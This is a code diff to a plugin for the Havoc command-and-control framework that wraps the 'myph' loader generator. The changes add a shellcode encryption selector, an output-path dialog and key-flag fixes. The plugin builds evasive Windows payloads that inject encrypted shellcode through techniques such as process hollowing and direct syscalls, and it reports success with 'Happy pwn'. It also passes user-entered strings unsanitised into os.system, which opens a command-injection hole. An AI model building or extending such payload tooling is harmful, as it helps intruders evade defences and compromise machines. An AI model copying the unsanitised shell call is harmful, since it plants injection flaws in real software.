@@ -14,6 +14,7 @@ from datetime import datetime
 # Configuration
 MYPH_LOADER_PATH = shutil.which("myph")
 MYPH_EXEC_TECHNIQUES = ["CRT", "ProcessHollowing", "CreateThread", "Syscall"]
+MYPH_ENCRYPT_TECHNIQUES = ["AES", "chacha20", "XOR", "blowfish"]
 
 # Variables & Defaults
 myph_shellcode_path = ""
@@ -21,6 +22,7 @@ myph_shellcode_encryption_key = ""
 myph_shellcode_encryption_kind = "AES"
 myph_target_process = "cmd.exe"
 myph_shellcode_execution_technique = "CRT"
+myph_output_path = "/tmp/myph.exe"
 
 # Colors
 HAVOC_ERROR = "#ff5555"  # Red
@@ -47,7 +49,7 @@ log = havocui.Logger("matro7sh myph Log")
 def myph_change_shellcode_exec_method(num):
     global myph_shellcode_execution_technique
     if num:
-        myph_shellcode_execution_technique = MYPH_EXEC_TECHNIQUES[num - 1]
+        myph_shellcode_execution_technique = MYPH_EXEC_TECHNIQUES[num]
     else:
         myph_shellcode_execution_technique = "CRT"
     print("[*] Shellcode execution method changed: ", myph_shellcode_execution_technique)
@@ -75,6 +77,14 @@ def myph_change_default_key(k):
     myph_shellcode_encryption_key = k
     print("[*] Key changed: ", myph_shellcode_encryption_key)
 
+def myph_change_shellcode_encrypt_method(num):
+    global myph_shellcode_encryption_kind
+    if num:
+        myph_shellcode_encryption_kind = MYPH_ENCRYPT_TECHNIQUES[num]
+    else:
+        myph_shellcode_encryption_kind = "AES"
+    print("[*] Shellcode encryption method changed: ", myph_shellcode_encryption_kind)
+
 
 def myph_change_shellcode_path():
     global myph_shellcode_path
@@ -97,6 +107,10 @@ def myph_run():
         global myph_shellcode_execution_technique
         global myph_target_process
         global myph_shellcode_encryption_kind
+        global myph_output_path
+
+        myph_output_path = havocui.savefiledialog("Output Path").decode("ascii")
+        print("[*] Output Path changed: ", myph_output_path, ".")
 
         base_cmd = f'{MYPH_LOADER_PATH}'
         if myph_shellcode_path != "":
@@ -106,7 +120,7 @@ def myph_run():
             base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_kind}'
 
         if myph_shellcode_encryption_key != "":
-            base_cmd = f'{base_cmd} --encryption {myph_shellcode_encryption_key}'
+            base_cmd = f'{base_cmd} --key {myph_shellcode_encryption_key}'
 
         if myph_target_process != "":
             base_cmd = f'{base_cmd} --process {myph_target_process}'
@@ -114,12 +128,16 @@ def myph_run():
         if myph_shellcode_execution_technique != "":
             base_cmd = f'{base_cmd} --technique {myph_shellcode_execution_technique}'
 
-        base_cmd = f'{base_cmd} --out /tmp/myph.exe'
+        base_cmd = f'{base_cmd} --out {myph_output_path}'
         print(f"[+] Command to be run: {base_cmd}")
         return base_cmd
 
     def execute():
-        log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
+        if myph_shellcode_encryption_key == "":
+            log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] No AES key provide it will be random one.")
+        else:
+            log.addText(f"[<span style=\"color:{HAVOC_INFO};\">*</span>] AES key provided = {myph_shellcode_encryption_key}.")
+
         cmd = get_build_command()
 
         os.system(cmd)
@@ -128,7 +146,7 @@ def myph_run():
         log.addText(f"Command has been be executed")
         log.addText(f"Check client log to see the output")
         log.addText(
-            f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at /tmp/myph.exe using myph loader. Happy pwn</b>")
+            f"<b style=\"color:{HAVOC_SUCCESS};\">Payload generated successfully at {myph_output_path} using myph loader. Happy pwn</b>")
         log.setBottomTab()
 
     log.setBottomTab()
@@ -160,8 +178,12 @@ def myph_loader_generator():
         dialog.addLabel(myph_label_to_replace)
 
         dialog.addLabel("<b>[*] Shellcode execution method</b>")
-        dialog.addCombobox(myph_change_shellcode_exec_method, "CRT", *MYPH_EXEC_TECHNIQUES)
+        dialog.addCombobox(myph_change_shellcode_exec_method, *MYPH_EXEC_TECHNIQUES)
         dialog.addLabel(myph_label_execution_technique)
+
+        dialog.addLabel("<b>[*] Shellcode encryption method</b>")
+        dialog.addCombobox(myph_change_shellcode_encrypt_method, *MYPH_ENCRYPT_TECHNIQUES)
+
 
         dialog.addLabel("<b>[*] AES Encryption key (Default: random)</b>")
         dialog.addLineedit("e.g. 0123456789ABCDEF1123345611111111", myph_change_default_key)
